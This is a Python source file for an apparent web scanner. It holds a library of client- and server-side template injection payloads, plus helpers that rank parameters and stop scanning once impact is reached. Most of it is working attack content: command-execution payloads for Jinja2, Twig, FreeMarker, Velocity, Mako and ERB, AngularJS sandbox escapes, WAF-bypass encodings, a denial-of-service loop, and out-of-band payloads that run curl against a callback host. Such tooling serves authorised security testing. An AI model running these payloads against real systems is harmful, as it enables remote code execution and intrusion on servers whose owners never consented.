"""
CSTI Payload Library

PURE data and functions for CSTI/SSTI payload generation.
Contains the complete payload library organized by engine,
parameter prioritization, and impact classification.
"""

from typing import Dict, List, Tuple


# =========================================================================
# PAYLOAD LIBRARY: Engine-specific payload collections
# =========================================================================

PAYLOAD_LIBRARY: Dict[str, List[str]] = {
    # ================================================================
    # UNIVERSAL ARITHMETIC PROBES (work on most engines)
    # ================================================================
    "universal": [
        # THE OMNI-PROBE (User Inspired): XSS + CSTI + SSTI Polyglot
        "'\"><script id=bt-pwn>fetch('https://{{interactsh_url}}')</script>{{7*7}}${7*7}<% 7*7 %>",
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "[[7*7]]",
        "{7*7}",
        "{{7*'7'}}",
        "${7*'7'}",
    ],

    # ================================================================
    # ANGULAR-SPECIFIC (CSTI) - IMPROVED 2026-01-30
    # ================================================================
    "angular": [
        # SIMPLE ARITHMETIC (highest priority - works on most Angular apps)
        "{{7*7}}",
        "{{7*'7'}}",
        "{{49}}",  # Direct number to test reflection
        # Constructor-based
        "{{constructor.constructor('return 7*7')()}}",
        "{{$on.constructor('return 7*7')()}}",
        "{{[].pop.constructor('return 7*7')()}}",
        "{{[].push.constructor('return 7*7')()}}",
        # Error-based detection
        "{{a]}}",
        "{{'a]'}}",
        # Sandbox bypasses (Angular 1.x - ginandjuice.shop uses older Angular)
        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(document.domain)');}}",
        "{{'a]'.constructor.prototype.charAt=[].join;$eval('x=alert(document.domain)');}}",
        '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(document.domain)"].sort(toString.constructor);}}',
        # More sandbox bypasses for different Angular versions
        "{{$eval.constructor('return 7*7')()}}",
        "{{$parse.constructor('return 7*7')()}}",
        # ------------------------------------------------------------
        # DOUBLE-QUOTE VARIANTS (for servers that error on single quotes)
        # ginandjuice.shop returns 500 on single quotes, but accepts double quotes
        # ------------------------------------------------------------
        '{{constructor.constructor("return 7*7")()}}',
        '{{constructor.constructor("alert(1)")()}}',
        '{{$on.constructor("return 7*7")()}}',
        '{{[].pop.constructor("return 7*7")()}}',
        '{{[].push.constructor("return 7*7")()}}',
        '{{$eval.constructor("return 7*7")()}}',
        '{{$parse.constructor("return 7*7")()}}',
    ],

    # ================================================================
    # VUE-SPECIFIC (CSTI)
    # ================================================================
    "vue": [
        "{{7*7}}",
        "{{constructor.constructor('return 7*7')()}}",
        "{{_c.constructor('return 7*7')()}}",
    ],

    # ================================================================
    # JINJA2-SPECIFIC (SSTI)
    # ================================================================
    "jinja2": [
        "{{config}}",
        "{{config.items()}}",
        "{{self.__init__.__globals__}}",
        "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        # OOB (with placeholder)
        "{{config.__class__.__init__.__globals__['os'].popen('curl {{INTERACTSH}}').read()}}",
        # Blind detection
        "{% for x in range(100000000) %}a{% endfor %}",  # DoS-based detection
    ],

    # ================================================================
    # TWIG-SPECIFIC (SSTI)
    # ================================================================
    "twig": [
        "{{7*7}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{app.request.server.all|join(',')}}",
        # OOB
        "{{['curl {{INTERACTSH}}']|filter('exec')}}",
    ],

    # ================================================================
    # FREEMARKER-SPECIFIC (SSTI)
    # ================================================================
    "freemarker": [
        "${7*7}",
        '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
        '<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}',
        # OOB
        '${\"freemarker.template.utility.Execute\"?new()(\"curl {{INTERACTSH}}\")}',
    ],

    # ================================================================
    # VELOCITY-SPECIFIC (SSTI)
    # ================================================================
    "velocity": [
        "#set($x=7*7)$x",
        "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('id')",
        # OOB
        "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('curl {{INTERACTSH}}')",
    ],

    # ================================================================
    # MAKO-SPECIFIC (SSTI)
    # ================================================================
    "mako": [
        "${7*7}",
        "${self.module.cache.util.os.popen('id').read()}",
        "<%import os%>${os.popen('id').read()}",
        # OOB
        "<%import os%>${os.popen('curl {{INTERACTSH}}').read()}",
    ],

    # ================================================================
    # ERB-SPECIFIC (Ruby)
    # ================================================================
    "erb": [
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        # OOB
        "<%= system('curl {{INTERACTSH}}') %>",
    ],

    # ================================================================
    # POLYGLOTS (work across multiple engines)
    # ================================================================
    "polyglots": [
        "{{7*7}}${7*7}<%= 7*7 %>#{7*7}",
        "${{7*7}}",
        "{{7*7}}[[7*7]]",
    ],

    # ================================================================
    # WAF BYPASS VARIANTS (encoded versions)
    # ================================================================
    "waf_bypass": [
        # URL encoded
        "%7b%7b7*7%7d%7d",
        # Unicode
        "\\u007b\\u007b7*7\\u007d\\u007d",
        # Double encoded
        "%257b%257b7*7%257d%257d",
        # HTML entities
        "&#123;&#123;7*7&#125;&#125;",
        # Mixed case (for JS engines)
        "{{7*7}}",
    ],
}


# =========================================================================
# VICTORY HIERARCHY: Early exit based on payload impact
# =========================================================================

HIGH_IMPACT_INDICATORS: List[str] = [
    "id=",           # RCE: id command output
    "uid=",          # RCE: uid from id
    "whoami",        # RCE: whoami output
    "/etc/passwd",   # File read
    "root:",         # passwd content
    "__globals__",   # Python internals access
    "os.popen",      # Command execution
    "subprocess",    # Command execution
    "java.lang.Runtime",  # Java RCE
]

MEDIUM_IMPACT_INDICATORS: List[str] = [
    "49",            # Arithmetic evaluation (7*7)
    "Config",        # Config access
    "SECRET",        # Secret key access
]


# =========================================================================
# HIGH PRIORITY PARAMETERS: Most likely to be template-injectable
# =========================================================================

HIGH_PRIORITY_PARAMS: List[str] = [
    # Template-related
    "template", "tpl", "view", "layout", "page",
    # Content rendering
    "content", "text", "body", "message", "msg",
    "title", "subject", "name", "description",
    # Dynamic
    "preview", "render", "output", "display",
    # Input
    "input", "value", "data", "query", "q", "search",
    # File/Path
    "file", "path", "include", "partial",
    # ADDED (2026-01-30): Common vulnerable params from real-world findings
    "category", "filter", "sort", "lang", "locale", "theme",
]


# =========================================================================
# CSTI PRIORITIZATION LISTS
# =========================================================================

CSTI_HIGH_PRIORITY_PARAMS: List[str] = [
    "template", "message", "content", "subject", "body",
    "text", "comment", "description", "email_body", "sms_body",
]

CSTI_MEDIUM_PRIORITY_PARAMS: List[str] = [
    "search", "q", "query", "name", "title",
    "view", "page", "lang", "theme",
]


# =========================================================================
# API SSTI ENDPOINT NAMES
# =========================================================================

SSTI_ENDPOINT_NAMES = frozenset({
    "email-preview", "email-template", "email-templates", "render",
    "preview", "template", "report-preview", "pdf-render",
})

# SSTI payloads for API testing (engine, payload, expected, engine_name)
API_SSTI_PAYLOADS: List[Tuple[str, str, str]] = [
    ("{{7*7}}", "49", "jinja2"),
    ("{{7*'7'}}", "7777777", "jinja2"),
    ("${7*7}", "49", "freemarker"),
    ("<%= 7*7 %>", "49", "erb"),
    ("#{7*7}", "49", "ruby"),
]


# =========================================================================
# PURE FUNCTIONS: Payload impact and prioritization
# =========================================================================

def get_payload_impact_tier(payload: str, response: str) -> int:  # PURE
    """
    Determine impact tier for CSTI/SSTI.

    Args:
        payload: The CSTI payload sent
        response: The HTTP response body

    Returns:
        3 = RCE/File Read (STOP IMMEDIATELY)
        2 = Internals Access (STOP IMMEDIATELY)
        1 = Arithmetic Eval (Try 1 more)
        0 = No impact (Continue)
    """
    combined = (payload + " " + response).lower()

    # TIER 3: RCE or File Read
    if any(ind.lower() in combined for ind in HIGH_IMPACT_INDICATORS):
        return 3

    # TIER 2: Internals Access
    if "__globals__" in combined or "os.popen" in combined or "config" in combined:
        return 2

    # TIER 1: Arithmetic Evaluation
    if "49" in response and "7*7" in payload:
        return 1

    return 0


def should_stop_testing(
    payload: str, response: str, successful_count: int
) -> Tuple[bool, str]:  # PURE
    """
    Determine if testing should stop based on Victory Hierarchy.

    Args:
        payload: The payload that was tested
        response: The response received
        successful_count: Number of successful payloads so far

    Returns:
        Tuple of (should_stop, reason_message)
    """
    impact_tier = get_payload_impact_tier(payload, response)

    if impact_tier >= 3:
        return True, "MAXIMUM IMPACT: RCE or File Read achieved"

    if impact_tier >= 2:
        return True, "HIGH IMPACT: Internals access confirmed"

    if impact_tier >= 1 and successful_count >= 1:
        return True, "Template evaluation confirmed"

    if successful_count >= 2:
        return True, "2 successful payloads, moving on"

    return False, ""


def prioritize_params(params: List[Dict]) -> List[Dict]:  # PURE
    """
    Prioritize parameters likely to be template-injectable.

    Args:
        params: List of parameter dicts with 'parameter' key

    Returns:
        Reordered list: high-priority first, then medium, then low
    """
    high = []
    medium = []
    low = []

    for item in params:
        param = item.get("parameter", "").lower()

        is_high = any(hp in param or param in hp for hp in HIGH_PRIORITY_PARAMS)

        if is_high:
            high.append(item)
        elif any(x in param for x in ["id", "num", "page", "limit"]):
            low.append(item)
        else:
            medium.append(item)

    return high + medium + low


def prioritize_csti_params(all_params: Dict[str, str]) -> List[Dict]:  # PURE
    """
    Prioritize CSTI-related parameter names.

    Args:
        all_params: Dict mapping param names to default values

    Returns:
        Ordered list of param dicts: high priority first, then medium, then rest
    """
    prioritized = []

    # 1. High priority params first
    for param_name in CSTI_HIGH_PRIORITY_PARAMS:
        if param_name in all_params:
            prioritized.append({"parameter": param_name, "source": "html_form_high_priority"})

    # 2. Medium priority params
    for param_name in CSTI_MEDIUM_PRIORITY_PARAMS:
        if param_name in all_params and param_name not in [p["parameter"] for p in prioritized]:
            prioritized.append({"parameter": param_name, "source": "html_form_medium_priority"})

    # 3. All other discovered params
    for param_name in all_params.keys():
        if param_name not in [p["parameter"] for p in prioritized]:
            prioritized.append({"parameter": param_name, "source": "html_form_discovered"})

    return prioritized


def build_l2_payload_list(
    engines: List[str], interactsh_url: str = ""
) -> List[str]:  # PURE
    """
    Build the complete L2 static bombing payload list.

    Engine-specific payloads first, then universal, polyglots, WAF bypass,
    then all remaining engine payloads.

    Args:
        engines: Detected engine names
        interactsh_url: Interactsh URL for OOB placeholder replacement

    Returns:
        Deduplicated ordered list of payloads
    """
    all_payloads = []
    seen = set()

    # Engine-specific payloads first (prioritized)
    for engine in engines:
        for p in PAYLOAD_LIBRARY.get(engine, []):
            if p not in seen:
                seen.add(p)
                all_payloads.append(p)

    # Universal + polyglots + WAF bypass
    for key in ["universal", "polyglots", "waf_bypass"]:
        for p in PAYLOAD_LIBRARY.get(key, []):
            if p not in seen:
                seen.add(p)
                all_payloads.append(p)

    # All remaining engine payloads (engines not yet covered)
    for engine_name in PAYLOAD_LIBRARY:
        if engine_name not in ["universal", "polyglots", "waf_bypass"] + engines:
            for p in PAYLOAD_LIBRARY.get(engine_name, []):
                if p not in seen:
                    seen.add(p)
                    all_payloads.append(p)

    # Replace Interactsh placeholders
    if interactsh_url:
        all_payloads = [p.replace("{{INTERACTSH}}", interactsh_url) for p in all_payloads]

    return all_payloads


def get_universal_bypass_payloads() -> List[str]:  # PURE
    """Return universal CSTI bypass payloads for fallback testing."""
    return [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{= 7*7 }}",
        "${{7*7}}", "{{7*'7'}}", "{{config}}",
        "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
    ]
